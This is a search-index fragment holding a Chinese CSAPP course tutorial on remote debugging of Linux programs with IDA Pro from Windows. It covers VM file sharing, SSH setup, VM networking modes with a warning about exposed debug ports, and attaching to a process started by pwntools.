\u8fd9\u5e94\u8be5\u662f\u5927\u90e8\u5206\u4eba\u4f1a\u4f7f\u7528\u7684\u73af\u5883\u3002\u4f60\u9700\u8981\u4e00\u53f0\u8fd0\u884c\u7740Windows\u64cd\u4f5c\u7cfb\u7edf\u7684\u4e3b\u673a\uff0c\u4ee5\u53ca\u4e00\u4efdIDA Pro\u3002\u4f60\u770b\u5230\u4e86Remote Linux Debugger\uff0c\u6ca1\u9519\uff0c\u4f60\u8fd8\u9700\u8981\u4e00\u4e2a\u8fd0\u884c\u7740Linux\u64cd\u4f5c\u7cfb\u7edf\u7684\u4e3b\u673a\u3002\u4e0d\u8fc7\u8fd9\u4e2a\u53ef\u4ee5\u662f\u4f60\u672c\u5730\u7684Linux\u865a\u62df\u673a\uff0c\u4e5f\u53ef\u4ee5\u662f\u4f60\u8fb9\u4e0a\u7684\u4f8b\u5982\u5c40\u57df\u7f51\u91cc\u7684\u4e00\u53f0\u8fd0\u884c\u7740Linux\u7cfb\u7edf\u7684\u4e3b\u673a\uff0c\u751a\u81f3\u53ef\u4ee5\u662f\u4e91\u4e3b\u673a\uff08\u8fd9\u4e2a\u6bd4\u8f83\u5371\u9669\uff09\u6216\u8005\u662f\u4e00\u4e2aDocker\u5bb9\u5668\uff08\u5e94\u8be5\u53ef\u4ee5\uff0c\u4e0d\u8fc7\u6211\u8fd8\u6ca1\u8bd5\u8fc7\uff09\u3002\u4e0b\u9762\u4ee5Linux\u865a\u62df\u673a\u4e3a\u4f8b\u6765\u778e\u626f\u4e00\u4e0b\u3002 \u6765\u641e\u5b9a\u4e00\u4e0b\u865a\u62df\u673a \u6211\u5c31\u5047\u8bbe\u4f60\u5df2\u7ecf\u62e5\u6709\u4e86\u4e00\u4e2aLinux\u865a\u62df\u673a\uff0c\u662f\u5565\u53d1\u884c\u7248\u5e94\u8be5\u4e0d\u91cd\u8981\u3002\u4e0d\u8fc7\u4f60\u6b63\u4f7f\u7528\u7684\u865a\u62df\u5316\u8f6f\u4ef6\u53ef\u80fd\u4f1a\u7a0d\u5fae\u5f71\u54cd\u5230\u540e\u7eed\u7684\u64cd\u4f5c\u3002 \u4f60\u9700\u8981\u5148\u542f\u52a8\u4f60\u7684Linux\u865a\u62df\u673a\uff0c\u5982\u679c\u4f60\u5df2\u7ecf\u53ef\u4ee5\u81ea\u7531\u5730\u5728\u5bbf\u4e3b\u673a\u548c\u865a\u62df\u673a\u4e4b\u95f4\u5171\u4eab\u6587\u4ef6\u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u8df3\u8fc7\u4e0b\u9762\u8fd9\u4e00\u5c0f\u8282\u3002 \u5229\u7528VMware Tools \u5f53\u7136\uff0c\u4f60\u5f97\u6b63\u5728\u4f7f\u7528VMware\u8fdb\u884c\u865a\u62df\u5316\u3002\u901a\u8fc7\u5728\u83dc\u5355\u680f\u4e2d\u9009\u4e2d\u5b89\u88c5VMware Tools\uff0c\u4f60\u5e94\u8be5\u80fd\u53d1\u73b0\u6709\u4e00\u4e2a\u5149\u9a71\u88ab\u52a0\u8f7d\u5230\u4e86\u865a\u62df\u673a\u4e2d\u3002\u8fd9\u4e2a\u65f6\u5019\u53ea\u9700\u8981\u8fd0\u884c\u865a\u62df\u5149\u9a71\u5185\u7684\u5b89\u88c5\u7a0b\u5e8f\u5373\u53ef\u3002\u5e94\u8be5\u5728\u91cd\u542f\u540e\uff0c\u4f60\u5c31\u53ef\u4ee5\u81ea\u7531\u5730\u5728\u5bbf\u4e3b\u673a\u548c\u865a\u62df\u673a\u4e4b\u95f4\u62d6\u62fd\u6587\u4ef6\u548c\u5171\u4eab\u526a\u8d34\u677f\u4e86\u3002 \u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u4f60\u53ef\u4ee5\u53c2\u8003 \u8fd9\u91cc \u3002 \u53e6\u5916\uff0c\u5bf9\u4e8eVirtualBox\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 VBoxGuestAdditions \u3002\u603b\u4e4b\u9053\u7406\u662f\u5dee\u4e0d\u591a\u7684\u3002 \u5229\u7528SFTP \u5229\u7528\u4f60\u7684\u5305\u7ba1\u7406\u5de5\u5177\u5b89\u88c5 openssh-server \u3002 \u5bf9\u4e8eUbuntu\uff0c\u4f60\u53ef\u4ee5\uff1a 1 2 sudo apt update sudo apt install openssh-server \u5bf9\u4e8eCentOS\uff0c\u4f60\u53ef\u4ee5\uff1a 1 2 sudo yum update sudo yum install openssh-server \u5728\u5b89\u88c5\u6210\u529f\u540e\uff0c\u4f60\u9700\u8981\u542f\u52a8\u670d\u52a1\uff1a 1 sudo service sshd start \u6216\u662f\uff1a 1 sudo systemctl start sshd \u67d0\u4e9b\u65f6\u5019\uff0c\u53ef\u80fd\u662f ssh \u800c\u975e sshd \u3002 \u8fd9\u4e2a\u65f6\u5019\u4f60\u5c31\u53ef\u4ee5\u901a\u8fc7SFTP\u6765\u4f20\u8f93\u6587\u4ef6\u4e86\u3002\u6211\u63a8\u8350\u4f60\u4f7f\u7528Xshell\u6765\u8fde\u63a5\u5e76\u63a7\u5236\uff0c\u4f7f\u7528Xftp\u6765\u4f20\u8f93\u6587\u4ef6\u3002 \u5173\u4e8e\u600e\u4e48\u8fde\u63a5 \u4f60\u5e94\u8be5\u8981\u77e5\u9053\u4f60\u7684\u865a\u62df\u5316\u8f6f\u4ef6\u63d0\u4f9b\u591a\u79cd\u4f9b\u865a\u62df\u673a\u8054\u7f51\u7684\u65b9\u5f0f\u3002 \u5982\u679c\u4f60\u6b63\u5728\u4f7f\u7528NAT\u65b9\u5f0f \u5bf9\u4e8eVMware\uff0c\u4f60\u53ef\u80fd\u4e0d\u9700\u8981\u7aef\u53e3\u8f6c\u53d1\u3002\u53ea\u9700\u8981\u5148\u901a\u8fc7 1 ifconfig \u83b7\u53d6\u5230\u865a\u62df\u673a\u7684IP\u5730\u5740\uff0c\u7136\u540e\u5728\u4f60\u7684SSH\u5ba2\u6237\u7aef\uff08\u4f8b\u5982Xshell\uff09\u4e2d\u8fde\u63a5\u8be5IP\u5730\u5740\u768422\u7aef\u53e3\u5373\u53ef\u3002 \u5bf9\u4e8eVirtualBox\uff0c\u4f60\u53ef\u80fd\u9700\u8981\u5728\u865a\u62df\u673a\u8bbe\u7f6e\u4e2d\u7684\u7f51\u7edc\u91cc\u9009\u62e9\u7aef\u53e3\u8f6c\u53d1\uff0c\u4f7f\u5f97\u5bbf\u4e3b\u673a\u53ef\u4ee5\u8bbf\u95ee\u865a\u62df\u673a\u768422\u7aef\u53e3\u3002\u53e6\u5916\uff0c\u540e\u7eed\u8c03\u8bd5\u65f6\uff0c\u4f60\u8fd8\u9700\u8981\u8bbe\u7f6e\u597d\u7aef\u53e3\u8f6c\u53d1\u4f7f\u5f97\u865a\u62df\u673a\u768423946\u7aef\u53e3\u53ef\u88ab\u8bbf\u95ee\u3002 \u5982\u679c\u4f60\u6b63\u5728\u4f7f\u7528\u6865\u63a5\u65b9\u5f0f \u4f60\u53ea\u9700\u8981\u5148\u83b7\u53d6IP\u5730\u5740\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u8fde\u63a5\u4e86\u3002 Danger \u5f3a\u70c8\u5efa\u8bae\u4e0d\u8981\u5728\u6ca1\u6709\u81ea\u5df1\u7684\u4e00\u5c42\u8def\u7531\u5668NAT\u4fdd\u62a4\u7684\u60c5\u51b5\u4e0b\u4f7f\u7528\u8fd9\u79cd\u65b9\u5f0f\uff01\u5f53\u4f60\u8c03\u8bd5\u7684\u65f6\u5019\u5c06\u4f1a\u5f00\u653e23946\u7aef\u53e3\uff0c\u4e00\u65e6\u6709\u4eba\u5229\u7528\u7aef\u53e3\u626b\u63cf\u83b7\u53d6\u5230\u4e86\u4fe1\u606f\uff0c\u4ed6\u5c06\u53ef\u4ee5\u5411\u4f60\u7684\u865a\u62df\u673a\u4f20\u8f93\u5371\u9669\u6587\u4ef6\u5e76\u8fd0\u884c\u5b83\uff01 \u53e6\u5916\uff0c\u8fd9\u4e5f\u540c\u65f6\u4f1a\u4f7f\u5f9722\u7aef\u53e3\u66b4\u9732\u3002\u5f31\u7684\u53e3\u4ee4\u5c06\u4f7f\u5f97\u653b\u51fb\u8005\u53ef\u4ee5\u63a7\u5236\u4f60\u7684\u865a\u62df\u673a\u3002 Warning \u8fd9\u4e2a\u65b9\u5f0f\u4e8b\u5b9e\u4e0a\u50cf\u662f\u865a\u62df\u673a\u4e5f\u6709\u4e2a\u7f51\u5361\u83b7\u53d6\u5230\u4e86IP\u5730\u5740\uff0c\u548c\u4f60\u7684\u4e3b\u673a\u5904\u4e8e\u540c\u4e00\u5c40\u57df\u7f51\u4e2d\uff0c\u50cf\u4e24\u53f0\u7535\u8111\u4e00\u6837\u3002 \u4f60\u5f97\u4fdd\u8bc1\u4f60\u6240\u8fde\u63a5\u7684\u7f51\u7edc\u4e0d\u4f1a\u9694\u79bb\u540c\u4e00\u5c40\u57df\u7f51\u4e2d\u7684\u4e3b\u673a\uff0c\u5426\u5219\u4f60\u5c06\u65e0\u6cd5\u901a\u4fe1\u3002\u4f8b\u5982\u4f60\u8fde\u63a5\u4e86\u6559\u5b66\u533a\u5f00\u653e\u5f0f\u7684\u65e0\u7ebf\u7f51\u7edc\uff0c\u5728\u6ca1\u6709\u62e8\u53f7\u8fc7\u8ba4\u8bc1\u524d\u5c06\u4e0d\u80fd\u548c\u5185\u7f51\u7684\u5176\u5b83\u4e3b\u673a\u901a\u4fe1\u3002\u4f46\u662f\u524d\u9762\u63d0\u5230\u6865\u63a5\u50cf\u662f\u6709\u4e24\u53f0\u7535\u8111\u4e00\u6837\uff0c\u7136\u800c\u4f60\u540c\u65f6\u5e94\u8be5\u53ea\u80fd\u8fc7\u4e00\u4e2a\u8bbe\u5907\u7684\u8ba4\u8bc1\uff0c\u6240\u4ee5\u4f60\u53ef\u80fd\u6ca1\u6709\u529e\u6cd5\u5728\u8fd9\u79cd\u7f51\u7edc\u73af\u5883\u4e2d\u4f7f\u5f97\u4e3b\u673a\u548c\u865a\u62df\u673a\u80fd\u4e92\u76f8\u901a\u4fe1\u3002 \u53cd\u6b63\u4f60\u53ef\u4ee5\u6709\u65e0\u6570\u79cd\u65b9\u6cd5\u53ef\u4ee5\u6765\u5171\u4eab\u6587\u4ef6\u3002\u6211\u5c31\u4e0d\u7ee7\u7eed\u5e9f\u8bdd\u4e0b\u53bb\u4e86\u3002 \u5f00\u59cb\u8c03\u8bd5\u5427 \u9996\u5148\u5982\u679c\u4f60\u7684\u865a\u62df\u673a\u4e0a\u8fd8\u6ca1\u6709 linux_server \u548c linux_server64 \u7684\u8bdd\uff0c\u4f60\u9700\u8981\u5148\u628a\u5b83\u4eec\u4f20\u8f93\u5230\u865a\u62df\u673a\u4e0a\u3002\u53e6\u5916\uff0c\u4f60\u8981\u8c03\u8bd5\u7684\u7a0b\u5e8f\u4e5f\u8981\u4f20\u8f93\u5230\u865a\u62df\u673a\u4e0a\u3002\u8bb0\u5f97\u8981\u8bb0\u4e0b\u5b83\u4eec\u7684\u8def\u5f84\u3002 \u4ec0\u4e48\uff1f\u4f60\u8bf4\u4f60\u4e0d\u77e5\u9053\u8fd9\u4e24\u4e2a\u7a0b\u5e8f\u5728\u54ea\u91cc\uff1f\u4f60\u53ef\u4ee5\u5728IDA\u76ee\u5f55\u4e0b\u7684dbgsrv\u6587\u4ef6\u5939\u4e2d\u627e\u5230\u5b83\u4eec\u3002 \u4f60\u9700\u8981\u5148\u542f\u52a8 linux_server \u6216\u662f linux_server64 \u3002\u8fd0\u884c\u54ea\u4e2a\u53d6\u51b3\u4e8e\u4f60\u8981\u8c03\u8bd532\u4f4d\u8fd8\u662f64\u4f4d\u7684\u7a0b\u5e8f\u4e86\u3002\u5982\u679c\u63d0\u793a\u6ca1\u6709\u6267\u884c\u6743\u9650\uff0c\u4f60\u53ef\u4ee5\uff1a 1 chmod +x ./linux_server \u7136\u540e\u5c31\u53ef\u4ee5\u542f\u52a8\u4e86\u3002\u8fd9\u4e2a\u65f6\u5019\u4f60\u5e94\u8be5\u80fd\u5728\u63a7\u5236\u53f0\u4e0a\u770b\u5230\u670d\u52a1\u5668\u6b63\u5728\u76d1\u542c\u7684\u4fe1\u606f\u3002 \u56de\u5230IDA\u4e2d\uff0c\u5728\u83dc\u5355\u680f\u4e2d\u9009\u62e9 Debugger->Select debugger \uff1a \u4e0d\u7528\u8bf4\uff0c\u9009\u62e9 Remote Linux Debugger \uff1a \u7136\u540e\u8fd8\u662f\uff1a \u586b\u5165\u4f60\u7684\u8981\u8c03\u8bd5\u7684\u7a0b\u5e8f\u5728\u670d\u52a1\u5668\uff08\u865a\u62df\u673a\uff09\u4e0a\u7684\u4f4d\u7f6e\u4ee5\u53ca\u76ee\u5f55\uff0c\u8fd8\u6709\u865a\u62df\u673a\u7684IP\u5730\u5740\uff1a \u786e\u5b9a\u540e\u5c31\u53ef\u4ee5\u70b9\u51fb\u83dc\u5355\u680f\u4e2d\u7684 Start process \u5f00\u59cb\u8c03\u8bd5\u4e86\u3002\u6253\u65ad\u70b9\uff0c\u7136\u540e\u5355\u6b65\u6267\u884c\uff0c\u770b\u5bc4\u5b58\u5668\u548c\u6808\u8fd9\u4e9b\u5e94\u8be5\u5c31\u4e0d\u7528\u6211\u8bf4\u4e86\u5427\u3002 \u8fd8\u6709Attach to process... \u6bd4\u5982\u4f60\u5728\u4f7f\u7528pwntools\u542f\u52a8\u4e86\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u8fd9\u4e2a\u65f6\u5019\u4f60\u4ecd\u7136\u53ef\u4ee5\u4f7f\u7528IDA\u6765\u8c03\u8bd5\u5b83\u3002 \u9996\u5148\u4f60\u9700\u8981\u5728\u4f60\u7684exp.py\u91cc\u5408\u9002\u7684\u5730\u65b9\u52a0\u4e0a\u4e00\u53e5\uff1a 1 pause () \u7136\u540e\u8fd8\u662f\u8dd1\u8d77exp\u3002\u56de\u5230IDA\u4e2d\u9009\u62e9 Attach to process... \uff0c\u7136\u540e\u9009\u62e9\u4f60\u8981\u8c03\u8bd5\u7684\u8fdb\u7a0b\uff0c\u5c31\u53ef\u4ee5\u5f00\u59cb\u4f60\u7684\u8868\u6f14\u4e86\u3002 Tip \u4f60\u7684 linux_server \u8fd8\u662f\u8981\u5f00\u7740\u3002 \u5176\u5b9e\u6709\u5f88\u591a\u5de5\u5177\u3001\u5f88\u591a\u65b9\u6cd5\u8c03\u8bd5\u5f88\u591a\u5e73\u53f0\u7684\u7a0b\u5e8f\u7684\uff0c\u65f6\u95f4\u5173\u7cfb\u6211\u53ea\u597d\u5148\u5217\u4e3e\u5176\u4e2d\u5e38\u7528\u7684\u4e00\u79cd\u53ef\u4ee5\u6765\u8c03\u8bd5\u5b9e\u9a8c\u7684\u65b9\u6cd5\u4e86\uff0c\u540e\u7eed\u6709\u7a7a\u800c\u4e14\u6709\u5fc5\u8981\u7684\u8bdd\u6211\u4f1a\u6162\u6162\u8865\u4e0a\u3002","title":"\u52a8\u6001\u8c03\u8bd5"},{"location":"szu_courses/csapp/debug/#windows-ida-remote-linux-debugger","text":"\u8fd9\u5e94\u8be5\u662f\u5927\u90e8\u5206\u4eba\u4f1a\u4f7f\u7528\u7684\u73af\u5883\u3002\u4f60\u9700\u8981\u4e00\u53f0\u8fd0\u884c\u7740Windows\u64cd\u4f5c\u7cfb\u7edf\u7684\u4e3b\u673a\uff0c\u4ee5\u53ca\u4e00\u4efdIDA Pro\u3002\u4f60\u770b\u5230\u4e86Remote Linux Debugger\uff0c\u6ca1\u9519\uff0c\u4f60\u8fd8\u9700\u8981\u4e00\u4e2a\u8fd0\u884c\u7740Linux\u64cd\u4f5c\u7cfb\u7edf\u7684\u4e3b\u673a\u3002\u4e0d\u8fc7\u8fd9\u4e2a\u53ef\u4ee5\u662f\u4f60\u672c\u5730\u7684Linux\u865a\u62df\u673a\uff0c\u4e5f\u53ef\u4ee5\u662f\u4f60\u8fb9\u4e0a\u7684\u4f8b\u5982\u5c40\u57df\u7f51\u91cc\u7684\u4e00\u53f0\u8fd0\u884c\u7740Linux\u7cfb\u7edf\u7684\u4e3b\u673a\uff0c\u751a\u81f3\u53ef\u4ee5\u662f\u4e91\u4e3b\u673a\uff08\u8fd9\u4e2a\u6bd4\u8f83\u5371\u9669\uff09\u6216\u8005\u662f\u4e00\u4e2aDocker\u5bb9\u5668\uff08\u5e94\u8be5\u53ef\u4ee5\uff0c\u4e0d\u8fc7\u6211\u8fd8\u6ca1\u8bd5\u8fc7\uff09\u3002\u4e0b\u9762\u4ee5Linux\u865a\u62df\u673a\u4e3a\u4f8b\u6765\u778e\u626f\u4e00\u4e0b\u3002","title":"Windows + IDA + Remote Linux Debugger"},{"location":"szu_courses/csapp/debug/#_1","text":"\u6211\u5c31\u5047\u8bbe\u4f60\u5df2\u7ecf\u62e5\u6709\u4e86\u4e00\u4e2aLinux\u865a\u62df\u673a\uff0c\u662f\u5565\u53d1\u884c\u7248\u5e94\u8be5\u4e0d\u91cd\u8981\u3002\u4e0d\u8fc7\u4f60\u6b63\u4f7f\u7528\u7684\u865a\u62df\u5316\u8f6f\u4ef6\u53ef\u80fd\u4f1a\u7a0d\u5fae\u5f71\u54cd\u5230\u540e\u7eed\u7684\u64cd\u4f5c\u3002 \u4f60\u9700\u8981\u5148\u542f\u52a8\u4f60\u7684Linux\u865a\u62df\u673a\uff0c\u5982\u679c\u4f60\u5df2\u7ecf\u53ef\u4ee5\u81ea\u7531\u5730\u5728\u5bbf\u4e3b\u673a\u548c\u865a\u62df\u673a\u4e4b\u95f4\u5171\u4eab\u6587\u4ef6\u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u8df3\u8fc7\u4e0b\u9762\u8fd9\u4e00\u5c0f\u8282\u3002","title":"\u6765\u641e\u5b9a\u4e00\u4e0b\u865a\u62df\u673a"},{"location":"szu_courses/csapp/debug/#vmware-tools","text":"\u5f53\u7136\uff0c\u4f60\u5f97\u6b63\u5728\u4f7f\u7528VMware\u8fdb\u884c\u865a\u62df\u5316\u3002\u901a\u8fc7\u5728\u83dc\u5355\u680f\u4e2d\u9009\u4e2d\u5b89\u88c5VMware Tools\uff0c\u4f60\u5e94\u8be5\u80fd\u53d1\u73b0\u6709\u4e00\u4e2a\u5149\u9a71\u88ab\u52a0\u8f7d\u5230\u4e86\u865a\u62df\u673a\u4e2d\u3002\u8fd9\u4e2a\u65f6\u5019\u53ea\u9700\u8981\u8fd0\u884c\u865a\u62df\u5149\u9a71\u5185\u7684\u5b89\u88c5\u7a0b\u5e8f\u5373\u53ef\u3002\u5e94\u8be5\u5728\u91cd\u542f\u540e\uff0c\u4f60\u5c31\u53ef\u4ee5\u81ea\u7531\u5730\u5728\u5bbf\u4e3b\u673a\u548c\u865a\u62df\u673a\u4e4b\u95f4\u62d6\u62fd\u6587\u4ef6\u548c\u5171\u4eab\u526a\u8d34\u677f\u4e86\u3002 \u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u4f60\u53ef\u4ee5\u53c2\u8003 \u8fd9\u91cc \u3002 \u53e6\u5916\uff0c\u5bf9\u4e8eVirtualBox\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 VBoxGuestAdditions \u3002\u603b\u4e4b\u9053\u7406\u662f\u5dee\u4e0d\u591a\u7684\u3002","title":"\u5229\u7528VMware Tools"},{"location":"szu_courses/csapp/debug/#sftp","text":"\u5229\u7528\u4f60\u7684\u5305\u7ba1\u7406\u5de5\u5177\u5b89\u88c5 openssh-server \u3002 \u5bf9\u4e8eUbuntu\uff0c\u4f60\u53ef\u4ee5\uff1a 1 2 sudo apt update sudo apt install openssh-server \u5bf9\u4e8eCentOS\uff0c\u4f60\u53ef\u4ee5\uff1a 1 2 sudo yum update sudo yum install openssh-server \u5728\u5b89\u88c5\u6210\u529f\u540e\uff0c\u4f60\u9700\u8981\u542f\u52a8\u670d\u52a1\uff1a 1 sudo service sshd start \u6216\u662f\uff1a 1 sudo systemctl start sshd \u67d0\u4e9b\u65f6\u5019\uff0c\u53ef\u80fd\u662f ssh \u800c\u975e sshd \u3002 \u8fd9\u4e2a\u65f6\u5019\u4f60\u5c31\u53ef\u4ee5\u901a\u8fc7SFTP\u6765\u4f20\u8f93\u6587\u4ef6\u4e86\u3002\u6211\u63a8\u8350\u4f60\u4f7f\u7528Xshell\u6765\u8fde\u63a5\u5e76\u63a7\u5236\uff0c\u4f7f\u7528Xftp\u6765\u4f20\u8f93\u6587\u4ef6\u3002","title":"\u5229\u7528SFTP"},{"location":"szu_courses/csapp/debug/#_2","text":"\u4f60\u5e94\u8be5\u8981\u77e5\u9053\u4f60\u7684\u865a\u62df\u5316\u8f6f\u4ef6\u63d0\u4f9b\u591a\u79cd\u4f9b\u865a\u62df\u673a\u8054\u7f51\u7684\u65b9\u5f0f\u3002","title":"\u5173\u4e8e\u600e\u4e48\u8fde\u63a5"},{"location":"szu_courses/csapp/debug/#nat","text":"\u5bf9\u4e8eVMware\uff0c\u4f60\u53ef\u80fd\u4e0d\u9700\u8981\u7aef\u53e3\u8f6c\u53d1\u3002\u53ea\u9700\u8981\u5148\u901a\u8fc7 1 ifconfig \u83b7\u53d6\u5230\u865a\u62df\u673a\u7684IP\u5730\u5740\uff0c\u7136\u540e\u5728\u4f60\u7684SSH\u5ba2\u6237\u7aef\uff08\u4f8b\u5982Xshell\uff09\u4e2d\u8fde\u63a5\u8be5IP\u5730\u5740\u768422\u7aef\u53e3\u5373\u53ef\u3002 \u5bf9\u4e8eVirtualBox\uff0c\u4f60\u53ef\u80fd\u9700\u8981\u5728\u865a\u62df\u673a\u8bbe\u7f6e\u4e2d\u7684\u7f51\u7edc\u91cc\u9009\u62e9\u7aef\u53e3\u8f6c\u53d1\uff0c\u4f7f\u5f97\u5bbf\u4e3b\u673a\u53ef\u4ee5\u8bbf\u95ee\u865a\u62df\u673a\u768422\u7aef\u53e3\u3002\u53e6\u5916\uff0c\u540e\u7eed\u8c03\u8bd5\u65f6\uff0c\u4f60\u8fd8\u9700\u8981\u8bbe\u7f6e\u597d\u7aef\u53e3\u8f6c\u53d1\u4f7f\u5f97\u865a\u62df\u673a\u768423946\u7aef\u53e3\u53ef\u88ab\u8bbf\u95ee\u3002","title":"\u5982\u679c\u4f60\u6b63\u5728\u4f7f\u7528NAT\u65b9\u5f0f"},{"location":"szu_courses/csapp/debug/#_3","text":"\u4f60\u53ea\u9700\u8981\u5148\u83b7\u53d6IP\u5730\u5740\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u8fde\u63a5\u4e86\u3002 Danger \u5f3a\u70c8\u5efa\u8bae\u4e0d\u8981\u5728\u6ca1\u6709\u81ea\u5df1\u7684\u4e00\u5c42\u8def\u7531\u5668NAT\u4fdd\u62a4\u7684\u60c5\u51b5\u4e0b\u4f7f\u7528\u8fd9\u79cd\u65b9\u5f0f\uff01\u5f53\u4f60\u8c03\u8bd5\u7684\u65f6\u5019\u5c06\u4f1a\u5f00\u653e23946\u7aef\u53e3\uff0c\u4e00\u65e6\u6709\u4eba\u5229\u7528\u7aef\u53e3\u626b\u63cf\u83b7\u53d6\u5230\u4e86\u4fe1\u606f\uff0c\u4ed6\u5c06\u53ef\u4ee5\u5411\u4f60\u7684\u865a\u62df\u673a\u4f20\u8f93\u5371\u9669\u6587\u4ef6\u5e76\u8fd0\u884c\u5b83\uff01 \u53e6\u5916\uff0c\u8fd9\u4e5f\u540c\u65f6\u4f1a\u4f7f\u5f9722\u7aef\u53e3\u66b4\u9732\u3002\u5f31\u7684\u53e3\u4ee4\u5c06\u4f7f\u5f97\u653b\u51fb\u8005\u53ef\u4ee5\u63a7\u5236\u4f60\u7684\u865a\u62df\u673a\u3002 Warning \u8fd9\u4e2a\u65b9\u5f0f\u4e8b\u5b9e\u4e0a\u50cf\u662f\u865a\u62df\u673a\u4e5f\u6709\u4e2a\u7f51\u5361\u83b7\u53d6\u5230\u4e86IP\u5730\u5740\uff0c\u548c\u4f60\u7684\u4e3b\u673a\u5904\u4e8e\u540c\u4e00\u5c40\u57df\u7f51\u4e2d\uff0c\u50cf\u4e24\u53f0\u7535\u8111\u4e00\u6837\u3002 \u4f60\u5f97\u4fdd\u8bc1\u4f60\u6240\u8fde\u63a5\u7684\u7f51\u7edc\u4e0d\u4f1a\u9694\u79bb\u540c\u4e00\u5c40\u57df\u7f51\u4e2d\u7684\u4e3b\u673a\uff0c\u5426\u5219\u4f60\u5c06\u65e0\u6cd5\u901a\u4fe1\u3002\u4f8b\u5982\u4f60\u8fde\u63a5\u4e86\u6559\u5b66\u533a\u5f00\u653e\u5f0f\u7684\u65e0\u7ebf\u7f51\u7edc\uff0c\u5728\u6ca1\u6709\u62e8\u53f7\u8fc7\u8ba4\u8bc1\u524d\u5c06\u4e0d\u80fd\u548c\u5185\u7f51\u7684\u5176\u5b83\u4e3b\u673a\u901a\u4fe1\u3002\u4f46\u662f\u524d\u9762\u63d0\u5230\u6865\u63a5\u50cf\u662f\u6709\u4e24\u53f0\u7535\u8111\u4e00\u6837\uff0c\u7136\u800c\u4f60\u540c\u65f6\u5e94\u8be5\u53ea\u80fd\u8fc7\u4e00\u4e2a\u8bbe\u5907\u7684\u8ba4\u8bc1\uff0c\u6240\u4ee5\u4f60\u53ef\u80fd\u6ca1\u6709\u529e\u6cd5\u5728\u8fd9\u79cd\u7f51\u7edc\u73af\u5883\u4e2d\u4f7f\u5f97\u4e3b\u673a\u548c\u865a\u62df\u673a\u80fd\u4e92\u76f8\u901a\u4fe1\u3002 \u53cd\u6b63\u4f60\u53ef\u4ee5\u6709\u65e0\u6570\u79cd\u65b9\u6cd5\u53ef\u4ee5\u6765\u5171\u4eab\u6587\u4ef6\u3002\u6211\u5c31\u4e0d\u7ee7\u7eed\u5e9f\u8bdd\u4e0b\u53bb\u4e86\u3002","title":"\u5982\u679c\u4f60\u6b63\u5728\u4f7f\u7528\u6865\u63a5\u65b9\u5f0f"},{"location":"szu_courses/csapp/debug/#_4","text":"\u9996\u5148\u5982\u679c\u4f60\u7684\u865a\u62df\u673a\u4e0a\u8fd8\u6ca1\u6709 linux_server \u548c linux_server64 \u7684\u8bdd\uff0c\u4f60\u9700\u8981\u5148\u628a\u5b83\u4eec\u4f20\u8f93\u5230\u865a\u62df\u673a\u4e0a\u3002\u53e6\u5916\uff0c\u4f60\u8981\u8c03\u8bd5\u7684\u7a0b\u5e8f\u4e5f\u8981\u4f20\u8f93\u5230\u865a\u62df\u673a\u4e0a\u3002\u8bb0\u5f97\u8981\u8bb0\u4e0b\u5b83\u4eec\u7684\u8def\u5f84\u3002 \u4ec0\u4e48\uff1f\u4f60\u8bf4\u4f60\u4e0d\u77e5\u9053\u8fd9\u4e24\u4e2a\u7a0b\u5e8f\u5728\u54ea\u91cc\uff1f\u4f60\u53ef\u4ee5\u5728IDA\u76ee\u5f55\u4e0b\u7684dbgsrv\u6587\u4ef6\u5939\u4e2d\u627e\u5230\u5b83\u4eec\u3002 \u4f60\u9700\u8981\u5148\u542f\u52a8 linux_server \u6216\u662f linux_server64 \u3002\u8fd0\u884c\u54ea\u4e2a\u53d6\u51b3\u4e8e\u4f60\u8981\u8c03\u8bd532\u4f4d\u8fd8\u662f64\u4f4d\u7684\u7a0b\u5e8f\u4e86\u3002\u5982\u679c\u63d0\u793a\u6ca1\u6709\u6267\u884c\u6743\u9650\uff0c\u4f60\u53ef\u4ee5\uff1a 1 chmod +x ./linux_server \u7136\u540e\u5c31\u53ef\u4ee5\u542f\u52a8\u4e86\u3002\u8fd9\u4e2a\u65f6\u5019\u4f60\u5e94\u8be5\u80fd\u5728\u63a7\u5236\u53f0\u4e0a\u770b\u5230\u670d\u52a1\u5668\u6b63\u5728\u76d1\u542c\u7684\u4fe1\u606f\u3002 \u56de\u5230IDA\u4e2d\uff0c\u5728\u83dc\u5355\u680f\u4e2d\u9009\u62e9 Debugger->Select debugger \uff1a \u4e0d\u7528\u8bf4\uff0c\u9009\u62e9 Remote Linux Debugger \uff1a \u7136\u540e\u8fd8\u662f\uff1a \u586b\u5165\u4f60\u7684\u8981\u8c03\u8bd5\u7684\u7a0b\u5e8f\u5728\u670d\u52a1\u5668\uff08\u865a\u62df\u673a\uff09\u4e0a\u7684\u4f4d\u7f6e\u4ee5\u53ca\u76ee\u5f55\uff0c\u8fd8\u6709\u865a\u62df\u673a\u7684IP\u5730\u5740\uff1a \u786e\u5b9a\u540e\u5c31\u53ef\u4ee5\u70b9\u51fb\u83dc\u5355\u680f\u4e2d\u7684 Start process \u5f00\u59cb\u8c03\u8bd5\u4e86\u3002\u6253\u65ad\u70b9\uff0c\u7136\u540e\u5355\u6b65\u6267\u884c\uff0c\u770b\u5bc4\u5b58\u5668\u548c\u6808\u8fd9\u4e9b\u5e94\u8be5\u5c31\u4e0d\u7528\u6211\u8bf4\u4e86\u5427\u3002","title":"\u5f00\u59cb\u8c03\u8bd5\u5427"},{"location":"szu_courses/csapp/debug/#attach-to-process","text":"\u6bd4\u5982\u4f60\u5728\u4f7f\u7528pwntools\u542f\u52a8\u4e86\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u8fd9\u4e2a\u65f6\u5019\u4f60\u4ecd\u7136\u53ef\u4ee5\u4f7f\u7528IDA\u6765\u8c03\u8bd5\u5b83\u3002 \u9996\u5148\u4f60\u9700\u8981\u5728\u4f60\u7684exp.py\u91cc\u5408\u9002\u7684\u5730\u65b9\u52a0\u4e0a\u4e00\u53e5\uff1a 1 pause () \u7136\u540e\u8fd8\u662f\u8dd1\u8d77exp\u3002\u56de\u5230IDA\u4e2d\u9009\u62e9 Attach to process... 